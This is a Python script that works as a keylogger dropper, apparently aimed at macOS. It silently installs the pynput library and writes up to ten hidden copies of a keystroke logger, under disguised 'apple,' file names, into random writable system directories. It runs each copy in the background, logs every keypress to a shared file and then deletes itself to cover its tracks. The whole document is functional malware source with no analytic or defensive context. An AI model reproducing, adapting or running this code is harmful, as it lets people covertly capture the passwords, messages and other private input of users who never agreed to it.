import os
import random
import subprocess
import sys
import threading
import logging

subprocess.call([sys.executable, '-m', 'pip', 'install', 'pynput'])
from pynput.keyboard import Key, Listener

def on_press(key):
    logging.info(str(key))

def run_script(directory, randomfilename):
    script_path = os.path.join(directory, "apple," + randomfilename + ".py")
    subprocess.run(['python3', script_path], capture_output=True)

def get_accessible_subdirectories(directory):
    subdirectories = [d for d in os.listdir(directory) if os.path.isdir(os.path.join(directory, d)) and os.access(os.path.join(directory, d), os.W_OK)]
    return subdirectories

i = 0
root_directory = "/"
existing_directories = get_accessible_subdirectories(root_directory)

while i < 10 and existing_directories:
    # Choose a random existing directory
    selected_directory = random.choice(existing_directories)
    script_directory = os.path.join(root_directory, selected_directory)

    # Generate a random filename
    randomfilename = str(random.randint(-9223372036854775807, 9223372036854775807))

    # Check if the script can write in the selected directory
    if os.access(script_directory, os.W_OK):
        # Write the script file within the selected existing directory
        script_path = os.path.join(script_directory, "apple," + randomfilename + ".py")
        with open(script_path, "w") as file:
            file.write('import subprocess\r\n')
            file.write('import sys\r\n')
            file.write('subprocess.check_call([sys.executable, "-m", "pip", "install", "pynput"])\r\n')
            file.write("from pynput.keyboard import Key, Listener\r\n")
            file.write("import logging\r\n")
            file.write('log_dir = r"/Users/Shared/"\r\n')  # Set log_dir to the desired directory
            file.write('logging.basicConfig(filename=(log_dir + "applelogs.txt"), level=logging.DEBUG, format="%(asctime)s: %(message)s")\r\n')
            file.write("def on_press(key):\r\n")
            file.write("  logging.info(str(key))\r\n")
            file.write("with Listener(on_press=on_press) as listener:\r\n")
            file.write("  listener.join()\r\n")

        # Run the script in a separate thread
        thread = threading.Thread(target=run_script, args=(script_directory, randomfilename))
        thread.start()

        i += 1
# The deleting of the original file
os.remove(__file__)
